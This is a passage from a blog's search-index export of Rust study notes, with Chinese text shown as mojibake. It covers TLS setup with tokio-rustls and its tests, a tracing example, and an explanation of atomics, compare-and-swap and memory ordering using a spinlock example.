ClientConfig, ServerConfig&#125;;use tokio_rustls::rustls::&#123;AllowAnyAuthenticatedClient, NoClientAuth, PrivateKey, RootCertStore&#125;;use tokio_rustls::webpki::DNSNameRef;use tokio_rustls::TlsConnector;use tokio_rustls::&#123; client::TlsStream as ClientTlsStream, server::TlsStream as ServerTlsStream, TlsAcceptor,&#125;;use crate::KvError;/// Server ALPN (Application-Layer Protocol Negotiation)const ALPN_KV: &amp;str = \"kv\";/// å­˜æ”¾ TLS ServerConfig å¹¶æä¾›æ–¹æ³• accept æŠŠåº•å±‚çš„åè®®è½¬æ¢æˆ TLS#[derive(Clone)]pub struct TlsServerAcceptor &#123; inner: Arc&lt;ServerConfig&gt;,&#125;/// å­˜æ”¾ TLS Client å¹¶æä¾›æ–¹æ³• connect æŠŠåº•å±‚çš„åè®®è½¬æ¢æˆ TLS#[derive(Clone)]pub struct TlsClientConnector &#123; pub config: Arc&lt;ClientConfig&gt;, pub domain: Arc&lt;String&gt;,&#125;impl TlsClientConnector &#123; /// åŠ è½½ client cert / CA certï¼Œç”Ÿæˆ ClientConfig pub fn new( domain: impl Into&lt;String&gt;, identity: Option&lt;(&amp;str, &amp;str)&gt;, server_ca: Option&lt;&amp;str&gt;, ) -&gt; Result&lt;Self, KvError&gt; &#123; let mut config = ClientConfig::new(); // å¦‚æœæœ‰å®¢æˆ·ç«¯è¯ä¹¦ï¼ŒåŠ è½½ä¹‹ if let Some((cert, key)) = identity &#123; let certs = load_certs(cert)?; let key = load_key(key)?; config.set_single_client_cert(certs, key)?; &#125; // åŠ è½½æœ¬åœ°ä¿¡ä»»çš„æ ¹è¯ä¹¦é“¾ config.root_store = match rustls_native_certs::load_native_certs() &#123; Ok(store) | Err((Some(store), _)) =&gt; store, Err((None, error)) =&gt; return Err(error.into()), &#125;; // å¦‚æœæœ‰ç­¾ç½²æœåŠ¡å™¨çš„ CA è¯ä¹¦ï¼Œåˆ™åŠ è½½å®ƒ if let Some(cert) = server_ca &#123; let mut buf = Cursor::new(cert); config.root_store.add_pem_file(&amp;mut buf).unwrap(); &#125; Ok(Self &#123; config: Arc::new(config), domain: Arc::new(domain.into()), &#125;) &#125; /// è§¦å‘ TLS åè®®ï¼ŒæŠŠåº•å±‚çš„ stream è½¬æ¢æˆ TLS stream pub async fn connect&lt;S&gt;(&amp;self, stream: S) -&gt; Result&lt;ClientTlsStream&lt;S&gt;, KvError&gt; where S: AsyncRead + AsyncWrite + Unpin + Send, &#123; let dns = DNSNameRef::try_from_ascii_str(self.domain.as_str()) .map_err(|_| KvError::Internal(\"Invalid DNS name\".into()))?; let stream = TlsConnector::from(self.config.clone()) .connect(dns, stream) .await?; Ok(stream) &#125;&#125;impl TlsServerAcceptor &#123; /// åŠ è½½ server cert / CA certï¼Œç”Ÿæˆ ServerConfig pub fn new(cert: &amp;str, key: &amp;str, client_ca: Option&lt;&amp;str&gt;) -&gt; Result&lt;Self, KvError&gt; &#123; let certs = load_certs(cert)?; let key = load_key(key)?; let mut config = match client_ca &#123; None =&gt; ServerConfig::new(NoClientAuth::new()), Some(cert) =&gt; &#123; // å¦‚æœå®¢æˆ·ç«¯è¯ä¹¦æ˜¯æŸä¸ª CA è¯ä¹¦ç­¾å‘çš„ï¼Œåˆ™æŠŠè¿™ä¸ª CA è¯ä¹¦åŠ è½½åˆ°ä¿¡ä»»é“¾ä¸­ let mut cert = Cursor::new(cert); let mut client_root_cert_store = RootCertStore::empty(); client_root_cert_store .add_pem_file(&amp;mut cert) .map_err(|_| KvError::CertifcateParseError(\"CA\", \"cert\"))?; let client_auth = AllowAnyAuthenticatedClient::new(client_root_cert_store); ServerConfig::new(client_auth) &#125; &#125;; // åŠ è½½æœåŠ¡å™¨è¯ä¹¦ config .set_single_cert(certs, key) .map_err(|_| KvError::CertifcateParseError(\"server\", \"cert\"))?; config.set_protocols(&amp;[Vec::from(&amp;ALPN_KV[..])]); Ok(Self &#123; inner: Arc::new(config), &#125;) &#125; /// è§¦å‘ TLS åè®®ï¼ŒæŠŠåº•å±‚çš„ stream è½¬æ¢æˆ TLS stream pub async fn accept&lt;S&gt;(&amp;self, stream: S) -&gt; Result&lt;ServerTlsStream&lt;S&gt;, KvError&gt; where S: AsyncRead + AsyncWrite + Unpin + Send, &#123; let acceptor = TlsAcceptor::from(self.inner.clone()); Ok(acceptor.accept(stream).await?) &#125;&#125;fn load_certs(cert: &amp;str) -&gt; Result&lt;Vec&lt;Certificate&gt;, KvError&gt; &#123; let mut cert = Cursor::new(cert); pemfile::certs(&amp;mut cert).map_err(|_| KvError::CertifcateParseError(\"server\", \"cert\"))&#125;fn load_key(key: &amp;str) -&gt; Result&lt;PrivateKey, KvError&gt; &#123; let mut cursor = Cursor::new(key); // å…ˆå°è¯•ç”¨ PKCS8 åŠ è½½ç§é’¥ if let Ok(mut keys) = pemfile::pkcs8_private_keys(&amp;mut cursor) &#123; if !keys.is_empty() &#123; return Ok(keys.remove(0)); &#125; &#125; // å†å°è¯•åŠ è½½ RSA key cursor.set_position(0); if let Ok(mut keys) = pemfile::rsa_private_keys(&amp;mut cursor) &#123; if !keys.is_empty() &#123; return Ok(keys.remove(0)); &#125; &#125; // ä¸æ”¯æŒçš„ç§é’¥ç±»å‹ Err(KvError::CertifcateParseError(\"private\", \"key\"))&#125; æ ¹æ®æä¾›çš„è¯ä¹¦ï¼Œæ¥ç”Ÿæˆ tokio-tls éœ€è¦çš„ ServerConfig / ClientConfigã€‚ å› ä¸º TLS éœ€è¦éªŒè¯è¯ä¹¦çš„ CAï¼Œæ‰€ä»¥è¿˜éœ€è¦åŠ è½½ CA è¯ä¹¦ã€‚è™½ç„¶å¹³æ—¶åœ¨åš Web å¼€å‘æ—¶ï¼Œç»å¸¸åªä½¿ç”¨æœåŠ¡å™¨è¯ä¹¦ï¼Œä½†å…¶å® TLS æ”¯æŒåŒå‘éªŒè¯ï¼ŒæœåŠ¡å™¨ä¹Ÿå¯ä»¥éªŒè¯å®¢æˆ·ç«¯çš„è¯ä¹¦æ˜¯å¦æ˜¯å®ƒè®¤è¯†çš„ CA ç­¾å‘çš„ã€‚ æµ‹è¯•ä¸‰ç§æƒ…å†µï¼š æ ‡å‡†çš„ TLS è¿æ¥ å¸¦æœ‰å®¢æˆ·ç«¯è¯ä¹¦çš„ TLS è¿æ¥ å®¢æˆ·ç«¯æä¾›äº†é”™çš„åŸŸå 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#[cfg(test)]mod tests &#123; use std::net::SocketAddr; use super::*; use anyhow::Result; use tokio::&#123; io::&#123;AsyncReadExt, AsyncWriteExt&#125;, net::&#123;TcpListener, TcpStream&#125;, &#125;; // åœ¨ç¼–è¯‘æœŸæŠŠæ–‡ä»¶åŠ è½½æˆå­—ç¬¦ä¸²æ”¾åœ¨ RODATA æ®µ const CA_CERT: &amp;str = include_str!(\"ca.cert\"); const CLIENT_CERT: &amp;str = include_str!(\"client.cert\"); const CLIENT_KEY: &amp;str = include_str!(\"client.key\"); const SERVER_CERT: &amp;str = include_str!(\"server.cert\"); const SERVER_KEY: &amp;str = include_str!(\"server.key\"); #[tokio::test] async fn tls_should_work() -&gt; Result&lt;()&gt; &#123; let ca = Some(CA_CERT); let addr = start_server(None).await?; let connector = TlsClientConnector::new(\"right.com\", None, ca)?; let stream = TcpStream::connect(addr).await?; let mut stream = connector.connect(stream).await?; stream.write_all(b\"hello world!\").await?; let mut buf = [0; 12]; stream.read_exact(&amp;mut buf).await?; assert_eq!(&amp;buf, b\"hello world!\"); Ok(()) &#125; #[tokio::test] async fn tls_with_client_cert_should_work() -&gt; Result&lt;()&gt; &#123; let client_identity = Some((CLIENT_CERT, CLIENT_KEY)); let ca = Some(CA_CERT); let addr = start_server(ca.clone()).await?; let connector = TlsClientConnector::new(\"right.com\", client_identity, ca)?; let stream = TcpStream::connect(addr).await?; let mut stream = connector.connect(stream).await?; stream.write_all(b\"hello world!\").await?; let mut buf = [0; 12]; stream.read_exact(&amp;mut buf).await?; assert_eq!(&amp;buf, b\"hello world!\"); Ok(()) &#125; #[tokio::test] async fn tls_with_bad_domain_should_not_work() -&gt; Result&lt;()&gt; &#123; let addr = start_server(None).await?; let connector = TlsClientConnector::new(\"wrong.com\", None, Some(CA_CERT))?; let stream = TcpStream::connect(addr).await?; let result = connector.connect(stream).await; assert!(result.is_err()); Ok(()) &#125; async fn start_server(ca: Option&lt;&amp;str&gt;) -&gt; Result&lt;SocketAddr&gt; &#123; let acceptor = TlsServerAcceptor::new(SERVER_CERT, SERVER_KEY, ca)?; let echo = TcpListener::bind(\"127.0.0.1:0\").await.unwrap(); let addr = echo.local_addr().unwrap(); tokio::spawn(async move &#123; let (stream, _) = echo.accept().await.unwrap(); let mut stream = acceptor.accept(stream).await.unwrap(); let mut buf = [0; 12]; stream.read_exact(&amp;mut buf).await.unwrap(); stream.write_all(&amp;buf).await.unwrap(); &#125;); Ok(addr) &#125;&#125; å…¶å®ƒé€‰æ‹© Noise Protocol Frameworkï¼Œå¯ä½¿ç”¨çš„å·¥å…· snowã€‚ BONUS 12345678910111213use tracing::info;use tracing_subscriber::EnvFilter;fn main() &#123; tracing_subscriber::fmt::fmt() .with_env_filter(EnvFilter::from_default_env()) .init(); let url = \"&lt;https://www.rust-lang.org/&gt;\"; let _body = reqwest::blocking::get(url).unwrap().text().unwrap(); info!(\"Fetching url: &#123;&#125;\", url);&#125; 123RUST_LOG=debug cargo run --quiet# orRUST_LOG=trace cargo run --quiet å¯ä»¥è¾“å‡º Rust ä¸‹ç”¨ hyper å¤„ç† HTTP/2 çš„ä¸»è¦æµç¨‹å’Œæ¶ˆæ¯è®°å½•ã€‚åŒæ ·ï¼Œå¦‚æœæœ‰å…¶å®ƒä½¿ç”¨tracingæˆ–è€…æŸä¸ªlogå·¥å…·çš„ä¼˜ç§€å¼€æºåŒ…ï¼Œæ‹‰æ¥åˆ†æä¸€äº›ä»£ç ä¹‹å¤–çš„é—®é¢˜å’Œæ€è€ƒï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸ªä¸é”™çš„å·¥å…·ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"RUST-concurrency","slug":"RUST-concurrency","date":"2024-11-14T13:12:29.198Z","updated":"2024-11-15T13:10:47.023Z","comments":true,"path":"posts/7b9437f8.html","link":"","permalink":"https://racleray.github.io/posts/7b9437f8.html","excerpt":"Rust Notes","text":"å¹¶å‘æ˜¯ç¨‹åºå¤„ç†å¤šä¸ªä»»åŠ¡çš„èƒ½åŠ›ï¼Œéš¾ç‚¹åœ¨äºå¤šä¸ªä»»åŠ¡ä¹‹é—´å¦‚ä½•åä½œï¼Œå¦‚ä½•åŒæ­¥çŠ¶æ€ã€‚å‡ ç§å¸¸è§çš„å·¥ä½œæ¨¡å¼ï¼šè‡ªç”±ç«äº‰æ¨¡å¼ã€map/reduce æ¨¡å¼ã€DAG æ¨¡å¼ã€‚ åœ¨è‡ªç”±ç«äº‰æ¨¡å¼ä¸‹ï¼Œå¤šä¸ªå¹¶å‘ä»»åŠ¡ä¼šç«äº‰åŒä¸€ä¸ªä¸´ç•ŒåŒºçš„è®¿é—®æƒã€‚ä»»åŠ¡ä¹‹é—´åœ¨ä½•æ—¶ã€ä»¥ä½•ç§æ–¹å¼å»è®¿é—®ä¸´ç•ŒåŒºï¼Œæ˜¯ä¸ç¡®å®šçš„ï¼Œæˆ–è€…è¯´æ˜¯æœ€ä¸ºçµæ´»çš„ï¼Œåªè¦åœ¨è¿›å…¥ä¸´ç•ŒåŒºæ—¶è·å¾—ç‹¬å è®¿é—®å³å¯ã€‚ map/reduce æ¨¡å¼ï¼ŒæŠŠå·¥ä½œæ‰“æ•£ï¼ŒæŒ‰ç…§ç›¸åŒçš„å¤„ç†å®Œæˆåï¼Œå†æŒ‰ç…§ä¸€å®šçš„é¡ºåºå°†ç»“æœç»„ç»‡èµ·æ¥ã€‚ DAG æ¨¡å¼ï¼ŒæŠŠå·¥ä½œåˆ‡æˆä¸ç›¸äº¤çš„ã€æœ‰ä¾èµ–å…³ç³»çš„å­ä»»åŠ¡ï¼Œç„¶åæŒ‰ä¾èµ–å…³ç³»å¹¶å‘æ‰§è¡Œã€‚ å½“å¤„ç†å¤æ‚é—®é¢˜çš„æ—¶å€™ï¼Œä¸€ç§æ–¹æ³•æ˜¯å…ˆå˜æ¸…å…¶è„‰ç»œï¼Œç”¨åˆ†æ²»çš„æ€æƒ³æŠŠé—®é¢˜æ‹†è§£æˆæ­£äº¤çš„å­é—®é¢˜ï¼Œç„¶åç»„åˆåˆé€‚çš„å¹¶å‘æ¨¡å¼æ¥å¤„ç†è¿™äº›å­é—®é¢˜ã€‚ Atomic Atomic æ˜¯æ‰€æœ‰å¹¶å‘åŸè¯­çš„åŸºç¡€ï¼Œå®ƒä¸ºå¹¶å‘ä»»åŠ¡çš„åŒæ­¥å¥ å®šäº†åšå®çš„åŸºç¡€ã€‚å…ˆçœ‹ä¸€ä¸ª Lock çš„å®ç°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859use std::&#123;cell::RefCell, fmt, sync::Arc, thread&#125;;struct Lock&lt;T&gt; &#123; locked: RefCell&lt;bool&gt;, data: RefCell&lt;T&gt;,&#125;impl&lt;T&gt; fmt::Debug for Lock&lt;T&gt;where T: fmt::Debug,&#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result &#123; write!(f, \"Lock&lt;&#123;:?&#125;&gt;\", self.data.borrow()) &#125;&#125;// SAFETY: æˆ‘ä»¬ç¡®ä¿¡ Lock&lt;T&gt; å¾ˆå®‰å…¨ï¼Œå¯ä»¥åœ¨å¤šä¸ªçº¿ç¨‹ä¸­å…±äº«unsafe impl&lt;T&gt; Sync for Lock&lt;T&gt; &#123;&#125;impl&lt;T&gt; Lock&lt;T&gt; &#123; pub fn new(data: T) -&gt; Self &#123; Self &#123; data: RefCell::new(data), locked: RefCell::new(false), &#125; &#125; pub fn lock(&amp;self, op: impl FnOnce(&amp;mut T)) &#123; // å¦‚æœæ²¡æ‹¿åˆ°é”ï¼Œå°±ä¸€ç›´ spin while *self.locked.borrow() != false &#123;&#125; // **1 // æ‹¿åˆ°ï¼Œèµ¶ç´§åŠ é” *self.locked.borrow_mut() = true; // **2 // å¼€å§‹å¹²æ´» op(&amp;mut self.data.borrow_mut()); // **3 // è§£é” *self.locked.borrow_mut() = false; // **4 &#125;&#125;fn main() &#123; let data = Arc::new(Lock::new(0)); let data1 = data.clone(); let t1 = thread::spawn(move || &#123; data1.lock(|v| *v += 10); &#125;); let data2 = data.clone(); let t2 = thread::spawn(move || &#123; data2.lock(|v| *v *= 10); &#125;); t1.join().unwrap(); t2.join().unwrap(); println!(\"data: &#123;:?&#125;\", data);&#125; åœ¨ lock() æ–¹æ³•é‡Œï¼Œæ‹¿ä¸åˆ°é”çš„å¹¶å‘ä»»åŠ¡ä¼šä¸€ç›´ spinï¼Œæ‹¿åˆ°é”çš„ä»»åŠ¡å¯ä»¥å¹²æ´»ï¼Œå¹²å®Œæ´»åä¼šè§£é”ï¼Œè¿™æ ·ä¹‹å‰ spin çš„ä»»åŠ¡ä¼šç«äº‰åˆ°é”ï¼Œè¿›å…¥ä¸´ç•ŒåŒºã€‚è¿™é‡Œçš„å®ç°æœ‰ä¸€äº›æ½œåœ¨çš„ä¸æ˜“å‘ç°çš„é—®é¢˜ï¼š åœ¨å¤šæ ¸æƒ…å†µä¸‹ï¼Œ1 å’Œ 2 ä¹‹é—´ï¼Œæœ‰å¯èƒ½å…¶å®ƒçº¿ç¨‹ä¹Ÿç¢°å·§ spin ç»“æŸï¼ŒæŠŠ locked ä¿®æ”¹ä¸º trueã€‚è¿™æ ·ï¼Œå­˜åœ¨å¤šä¸ªçº¿ç¨‹æ‹¿åˆ°è¿™æŠŠé”ï¼Œç ´åäº†ä»»ä½•çº¿ç¨‹éƒ½æœ‰ç‹¬å è®¿é—®çš„ä¿è¯ã€‚ åœ¨å•æ ¸æƒ…å†µä¸‹ï¼Œ1 å’Œ 2 ä¹‹é—´ï¼Œä¹Ÿå¯èƒ½å› ä¸ºæ“ä½œç³»ç»Ÿçš„å¯æŠ¢å å¼è°ƒåº¦ï¼Œå¯¼è‡´ä¸Šè¿°é—®é¢˜å‘ç”Ÿã€‚ ç¼–è¯‘å™¨ä¼šæœ€å¤§ç¨‹åº¦ä¼˜åŒ–ç”Ÿæˆçš„æŒ‡ä»¤ï¼Œå¦‚æœæ“ä½œä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ï¼Œå¯èƒ½ä¼šç”Ÿæˆä¹±åºçš„æœºå™¨ç ï¼Œæ¯”å¦‚3 è¢«ä¼˜åŒ–æ”¾åœ¨ 1 ä¹‹å‰ï¼Œä»è€Œç ´åäº†è¿™ä¸ª lock çš„ä¿è¯ã€‚æ³¨æ„è¿™é‡Œçš„ 3 å’Œ 1 ä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ã€‚ å³ä¾¿ç¼–è¯‘å™¨ä¸åšä¹±åºå¤„ç†ï¼ŒCPU ä¹Ÿä¼šæœ€å¤§ç¨‹åº¦åšæŒ‡ä»¤çš„ä¹±åºæ‰§è¡Œï¼Œè®©æµæ°´çº¿çš„æ•ˆç‡æœ€é«˜ã€‚åŒæ ·ä¼šå‘ç”Ÿ 3 çš„é—®é¢˜ã€‚ è¿™ä¸ªé”çš„è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚å¯èƒ½å¤§éƒ¨åˆ†æ—¶é—´å¦‚æˆ‘ä»¬æ‰€æ„¿ï¼Œä½†ä¼šéšæœºå‡ºç°å¥‡å¥‡æ€ªæ€ªçš„è¡Œä¸ºã€‚ä¸€æ—¦è¿™æ ·çš„äº‹æƒ…å‘ç”Ÿï¼Œbug å¯èƒ½ä¼šä»¥å„ç§ä¸åŒçš„é¢è²Œå‡ºç°åœ¨ç³»ç»Ÿçš„å„ä¸ªè§’è½ã€‚è€Œä¸”ï¼Œè¿™æ ·çš„ bug å‡ ä¹æ˜¯æ— è§£çš„ï¼Œå› ä¸ºå®ƒå¾ˆéš¾ç¨³å®šå¤ç°ï¼Œè¡¨ç°è¡Œä¸ºå¾ˆä¸ä¸€è‡´ï¼Œç”šè‡³ï¼Œåªåœ¨æŸä¸ª CPU ä¸‹å‡ºç°ã€‚ ä¸ºäº†è§£å†³ä¸Šé¢è¿™æ®µä»£ç çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ CPU å±‚é¢åšä¸€äº›ä¿è¯ï¼Œè®©æŸäº›æ“ä½œæˆä¸ºåŸå­æ“ä½œã€‚ CAS æœ€åŸºç¡€çš„ä¿è¯æ˜¯ï¼šå¯ä»¥é€šè¿‡ä¸€æ¡æŒ‡ä»¤è¯»å–æŸä¸ªå†…å­˜åœ°å€ï¼Œåˆ¤æ–­å…¶å€¼æ˜¯å¦ç­‰äºæŸä¸ªå‰ç½®å€¼ï¼Œå¦‚æœç›¸ç­‰ï¼Œå°†å…¶ä¿®æ”¹ä¸ºæ–°çš„å€¼ã€‚è¿™å°±æ˜¯ Compare-and-swap æ“ä½œï¼Œç®€ç§°CASã€‚å®ƒæ˜¯æ“ä½œç³»ç»Ÿçš„å‡ ä¹æ‰€æœ‰å¹¶å‘åŸè¯­çš„åŸºçŸ³ï¼Œä½¿å¾—æˆ‘ä»¬èƒ½å®ç°ä¸€ä¸ªå¯ä»¥æ­£å¸¸å·¥ä½œçš„é”ã€‚ ä¸Šæ–‡ä¸­çš„ä»£ç ç¤ºä¾‹å¯ä»¥å°† 1 æ”¹å†™ä¸ºï¼š 1while self.locked.compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() &#123;&#125; å¦‚æœ locked å½“å‰çš„å€¼æ˜¯ falseï¼Œå°±å°†å…¶æ”¹æˆ trueã€‚è¿™æ•´ä¸ªæ“ä½œåœ¨ä¸€æ¡æŒ‡ä»¤é‡Œå®Œæˆï¼Œä¸ä¼šè¢«å…¶å®ƒçº¿ç¨‹æ‰“æ–­æˆ–è€…ä¿®æ”¹ï¼›å¦‚æœ locked çš„å½“å‰å€¼ä¸æ˜¯ falseï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›é”™è¯¯ï¼Œæˆ‘ä»¬ä¼šåœ¨æ­¤ä¸åœ spinï¼Œç›´åˆ°å‰ç½®æ¡ä»¶å¾—åˆ°æ»¡è¶³ã€‚è¿™é‡Œï¼Œcompare_exchange æ˜¯ Rust æä¾›çš„ CAS æ“ä½œï¼Œå®ƒä¼šè¢«ç¼–è¯‘æˆ CPU çš„å¯¹åº” CAS æŒ‡ä»¤ã€‚ åŒæ ·åœ¨é‡Šæ”¾é”çš„æ—¶å€™ï¼Œç›¸åº”åœ°éœ€è¦ä½¿ç”¨ atomic çš„ç‰ˆæœ¬ï¼Œè€Œéç›´æ¥èµ‹å€¼æˆ falseï¼š 1self.locked.store(false, Ordering::Release); Ordering é€šè¿‡ä½¿ç”¨ compare_exchange ï¼Œè§„é¿äº† 1 å’Œ 2 é¢ä¸´çš„é—®é¢˜ï¼Œä½†å¯¹äºå’Œç¼–è¯‘å™¨/CPUè‡ªåŠ¨ä¼˜åŒ–ç›¸å…³çš„ 3 å’Œ 4ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€äº›é¢å¤–å¤„ç†ã€‚è¿™å°±æ˜¯è¿™ä¸ªå‡½æ•°é‡Œé¢å¤–çš„ä¸¤ä¸ªå’Œ Ordering æœ‰å…³ã€‚ Relaxedï¼Œè¿™æ˜¯æœ€å®½æ¾çš„è§„åˆ™ï¼Œå®ƒå¯¹ç¼–è¯‘å™¨å’Œ CPU ä¸åšä»»ä½•é™åˆ¶ï¼Œå¯ä»¥ä¹±åºæ‰§è¡Œã€‚ Releaseï¼Œå½“å†™å…¥æ•°æ®çš„æ—¶å€™ï¼š å¯¹äºå½“å‰çº¿ç¨‹ï¼Œä»»ä½•è¯»å–æˆ–å†™å…¥æ“ä½œéƒ½ä¸èƒ½è¢«ä¹±åºæ’åœ¨è¿™ä¸ª store ä¹‹å å¯¹äºå…¶å®ƒçº¿ç¨‹ï¼Œå¦‚æœä½¿ç”¨äº† Acquire æ¥è¯»å–è¿™ä¸ª atomic çš„æ•°æ®ï¼Œé‚£ä¹ˆå®ƒä»¬çœ‹åˆ°çš„æ˜¯ä¿®æ”¹åçš„ç»“æœã€‚æ‰€ä»¥èƒ½ä¿è¯è¯»åˆ°æœ€æ–°çš„å€¼ã€‚ Acquire æ˜¯å½“è¯»å–æ•°æ®çš„æ—¶å€™: å¯¹äºå½“å‰çº¿ç¨‹ï¼Œä»»ä½•è¯»å–æˆ–è€…å†™å…¥æ“ä½œéƒ½ä¸èƒ½è¢«ä¹±åºæ’åœ¨è¿™ä¸ªè¯»å–ä¹‹å‰ã€‚ å¯¹äºå…¶å®ƒçº¿ç¨‹ï¼Œå¦‚æœä½¿ç”¨äº† Release æ¥ä¿®æ”¹æ•°æ®ï¼Œé‚£ä¹ˆï¼Œä¿®æ”¹çš„å€¼å¯¹å½“å‰çº¿ç¨‹å¯è§ã€‚ AcqRel æ˜¯Acquire å’Œ Release çš„ç»“åˆï¼ŒåŒæ—¶æ‹¥æœ‰ Acquire å’Œ Release çš„ä¿è¯ã€‚ ä¸€èˆ¬ç”¨åœ¨ fetch_xxx ä¸Šï¼Œæ¯”å¦‚å¯¹ä¸€ä¸ª atomic è‡ªå¢ 1ï¼Œä½ å¸Œæœ›è¿™ä¸ªæ“ä½œä¹‹å‰å’Œä¹‹åçš„è¯»å–æˆ–å†™å…¥æ“ä½œä¸ä¼šè¢«ä¹±åºï¼Œå¹¶ä¸”æ“ä½œçš„ç»“æœå¯¹å…¶å®ƒçº¿ç¨‹å¯è§ã€‚ SeqCst æ˜¯æœ€ä¸¥æ ¼çš„ orderingï¼Œé™¤äº† AcqRel çš„ä¿è¯å¤–ï¼Œå®ƒè¿˜ä¿è¯æ‰€æœ‰çº¿ç¨‹çœ‹åˆ°çš„æ‰€æœ‰ SeqCst æ“ä½œçš„é¡ºåºæ˜¯ä¸€è‡´çš„ã€‚ å› ä¸º CAS å’Œ ordering éƒ½æ˜¯ç³»ç»Ÿçº§çš„æ“ä½œï¼Œæ‰€ä»¥è¿™é‡Œæè¿°çš„ Ordering çš„ç”¨é€”åœ¨å„ç§è¯­è¨€ä¸­éƒ½å¤§åŒå°å¼‚ã€‚ å¯¹äº Rust æ¥è¯´ï¼Œå®ƒçš„ atomic åŸè¯­ç»§æ‰¿äº C++ã€‚C++ å…³äº ordering çš„æ–‡æ¡£è¦æ¸…æ™°å¾—å¤šã€‚ ç”±äº compare_exchange ä¼šç‹¬å è®¿é—®ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œä»¥ä¸‹ä¼˜åŒ–ï¼š 123456789while self .locked .compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed) .is_err()&#123; // compare_exchange éœ€è¦ç‹¬å è®¿é—®ï¼Œå½“æ‹¿ä¸åˆ°é”æ—¶ï¼Œæˆ‘ä»¬ // æ£€æµ‹ locked çš„çŠ¶æ€ï¼Œç›´åˆ°å…¶ unlocked åï¼Œå†å°è¯•æ‹¿é” while self.locked.load(Ordering::Relaxed) == true &#123;&#125;&#125; CAS æ˜¯ä¸ªä»£ä»·æ¯”è¾ƒé«˜çš„æ“ä½œï¼Œå®ƒéœ€è¦è·å¾—å¯¹åº”å†…å­˜çš„ç‹¬å è®¿é—®ï¼ˆexclusive accessï¼‰ï¼Œæˆ‘ä»¬å¸Œæœ›å¤±è´¥çš„æ—¶å€™åªæ˜¯ç®€å•è¯»å– atomic çš„çŠ¶æ€ï¼Œåªæœ‰ç¬¦åˆæ¡ä»¶çš„æ—¶å€™å†å»åšç‹¬å è®¿é—®ï¼Œè¿›è¡Œ CASã€‚ ä¸€ä¸ªå…¨å±€ Metrics çš„ç¤ºä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061use std::&#123; collections::HashMap, sync::atomic::&#123;AtomicUsize, Ordering&#125;,&#125;;// server statisticspub struct Metrics(HashMap&lt;&amp;'static str, AtomicUsize&gt;);impl Metrics &#123; pub fn new(names: &amp;[&amp;'static str]) -&gt; Self &#123; let mut metrics: HashMap&lt;&amp;'static str, AtomicUsize&gt; = HashMap::new(); for name in names.iter() &#123; metrics.insert(name, AtomicUsize::new(0)); &#125; Self(metrics) &#125; pub fn inc(&amp;self, name: &amp;'static str) &#123; if let Some(m) = self.0.get(name) &#123; m.fetch_add(1, Ordering::Relaxed); &#125; &#125; pub fn add(&amp;self, name: &amp;'static str, val: usize) &#123; if let Some(m) = self.0.get(name) &#123; m.fetch_add(val, Ordering::Relaxed); &#125; &#125; pub fn dec(&amp;self, name: &amp;'static str) &#123; if let Some(m) = self.0.get(name) &#123; m.fetch_sub(1, Ordering::Relaxed); &#125; &#125; pub fn snapshot(&amp;self) -&gt; Vec&lt;(&amp;'static str, usize)&gt; &#123; self.0 .iter() .map(|(k, v)| (*k, v.load(Ordering::Relaxed))) .collect() &#125;&#125;lazy_static! &#123; pub(crate) static ref METRICS: Metrics = Metrics::new(&amp;[ \"topics\", \"clients\", \"peers\", \"broadcasts\", \"servers\", \"states\", \"subscribers\" ]);&#125;fn main() &#123; METRICS.inc(\"topics\"); METRICS.inc(\"subscribers\"); println!(\"&#123;:?&#125;\", METRICS.snapshot());&#125; Mutex é€šè¿‡ SpinLock åšäº’æ–¥çš„å®ç°æ–¹å¼æœ‰ä½¿ç”¨åœºæ™¯çš„é™åˆ¶ï¼šå¦‚æœå—ä¿æŠ¤çš„ä¸´ç•ŒåŒºå¤ªå¤§ï¼Œé‚£ä¹ˆæ•´ä½“çš„æ€§èƒ½ä¼šæ€¥å‰§ä¸‹é™ï¼Œ CPU å¿™ç­‰ï¼Œæµªè´¹èµ„æºè¿˜ä¸å¹²å®äº‹ï¼Œä¸é€‚åˆä½œä¸ºä¸€ç§é€šç”¨çš„å¤„ç†æ–¹æ³•ã€‚æ›´é€šç”¨çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼šå½“å¤šä¸ªçº¿ç¨‹ç«äº‰åŒä¸€ä¸ª Mutex æ—¶ï¼Œè·å¾—é”çš„çº¿ç¨‹å¾—åˆ°ä¸´ç•ŒåŒºçš„è®¿é—®ï¼Œå…¶å®ƒçº¿ç¨‹è¢«æŒ‚èµ·ï¼Œæ”¾å…¥è¯¥ Mutex ä¸Šçš„ä¸€ä¸ªç­‰å¾…é˜Ÿåˆ—é‡Œã€‚å½“è·å¾—é”çš„çº¿ç¨‹å®Œæˆå·¥ä½œï¼Œé€€å‡ºä¸´ç•ŒåŒºæ—¶ï¼ŒMutex ä¼šç»™ç­‰å¾…é˜Ÿåˆ—å‘ä¸€ä¸ªä¿¡å·ï¼ŒæŠŠé˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªçº¿ç¨‹å”¤é†’ï¼Œäºæ˜¯è¿™ä¸ªçº¿ç¨‹å¯ä»¥è¿›è¡Œåç»­çš„è®¿é—®ã€‚ SpinLockå’Œ Mutex æœ€å¤§çš„ä¸åŒæ˜¯ï¼Œä½¿ç”¨ SpinLockï¼Œçº¿ç¨‹åœ¨å¿™ç­‰ï¼ˆbusy waitï¼‰ï¼Œè€Œä½¿ç”¨ 